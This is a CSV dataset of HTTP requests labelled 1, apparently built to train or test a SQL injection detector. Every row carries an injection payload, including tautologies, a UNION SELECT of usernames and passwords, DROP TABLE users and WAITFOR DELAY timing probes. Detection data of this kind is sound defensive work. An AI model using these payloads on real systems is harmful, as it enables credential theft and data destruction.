payload,label
GET /search/results?keyword=camera' OR '1'='1' --&category=gadgets HTTP/1.1,1
"GET /search/results?keyword=camera' UNION SELECT null, username, password FROM users --&category=gadgets HTTP/1.1",1
GET /search/results?keyword=camera' AND 1=1 --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' OR 'x'='x' --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' OR 1=1 --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' DROP TABLE users --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' AND 'a'='a' --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' OR 'a'='b' --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' AND 1=0 --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' AND 1=1; --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' OR (SELECT COUNT(*) FROM users) > 0 --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' HAVING 1=1 --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' GROUP BY username --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' --&category=gadgets HTTP/1.1,1
GET /search/results?keyword=camera' WAITFOR DELAY '00:00:05' --&category=gadgets HTTP/1.1,1
POST /search/results HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nkeyword=camera' OR '1'='1' --&category=gadgets,1
"GET /search/results?keyword=camera' UNION SELECT null, username, password FROM users --&category=gadgets HTTP/1.1",1
"PUT /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' OR '1'='1' --\"",\""category\"":\""gadgets\""}",1
DELETE /search/results?id=1' OR 1=1 -- HTTP/1.1,1
POST /search/results HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nkeyword=camera' DROP TABLE users --&category=gadgets,1
GET /search/results?keyword=camera' AND 1=1 --&category=gadgets HTTP/1.1,1
"POST /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' AND 1=1; --\"",\""category\"":\""gadgets\""}",1
"PATCH /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' OR 'x'='x' --\"",\""category\"":\""gadgets\""}",1
DELETE /search/results?id=1' AND 'a'='a' -- HTTP/1.1,1
"POST /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' OR 1=1 --\"",\""category\"":\""gadgets\""}",1
GET /search/results?keyword=camera' AND 1=0 --&category=gadgets HTTP/1.1,1
PUT /search/results HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nkeyword=camera' HAVING 1=1 --&category=gadgets,1
PATCH /search/results HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nkeyword=camera' GROUP BY username --&category=gadgets,1
"POST /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' OR (SELECT COUNT(*) FROM users) > 0 --\"",\""category\"":\""gadgets\""}",1
GET /search/results?keyword=camera' --&category=gadgets HTTP/1.1,1
DELETE /search/results?id=1' WAITFOR DELAY '00:00:05' --&category=gadgets HTTP/1.1,1
PUT /search/results HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nkeyword=camera' AND 1=1; --&category=gadgets,1
"POST /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' AND 1=1 --\"",\""category\"":\""gadgets\""}",1
DELETE /search/results?id=1' OR 'x'='x' -- HTTP/1.1,1
GET /search/results?keyword=camera' AND 1=1 --&category=gadgets HTTP/1.1,1
